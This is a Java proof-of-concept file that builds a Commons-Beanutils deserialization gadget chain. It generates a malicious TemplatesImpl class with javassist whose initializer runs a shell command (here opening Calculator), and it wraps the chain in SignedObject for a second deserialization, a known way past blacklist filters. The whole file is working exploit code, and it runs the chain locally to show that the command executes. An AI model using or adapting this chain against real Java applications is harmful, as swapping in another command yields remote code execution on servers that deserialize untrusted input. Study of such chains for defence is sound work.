package com.zbz;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javassist.*;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.security.*;
import java.util.HashMap;
import java.util.PriorityQueue;

public class cb_SignedObject_twice {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field f = obj.getClass().getDeclaredField(fieldName);
        f.setAccessible(true);
        f.set(obj, value);
    }
    public static CtClass getEvilClass() throws CannotCompileException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ct = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator\");";
        ct.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        ct.setName(randomClassName);
        ct.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        return ct;
    }

    public static PriorityQueue<Object> getPayload(Object object, String string) throws Exception {
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("2");
        setFieldValue(beanComparator, "property", string);
        setFieldValue(priorityQueue, "queue", new Object[]{object, null});
        return priorityQueue;
    }
    public static void Unser(Object obj) throws IOException, ClassNotFoundException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();
    }
    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        byte[][] bytes = new byte[][]{getEvilClass().toBytecode()};
        setFieldValue(templatesImpl, "_bytecodes", bytes);
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templatesImpl, "_name", "x");
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        PriorityQueue queue = getPayload(templatesImpl,"outputProperties");
        SignedObject signedObject = new SignedObject(queue, kp.getPrivate(), Signature.getInstance("DSA"));
        PriorityQueue<Object> priorityQueue = getPayload(signedObject,"object");
        Unser(priorityQueue);
    }

}
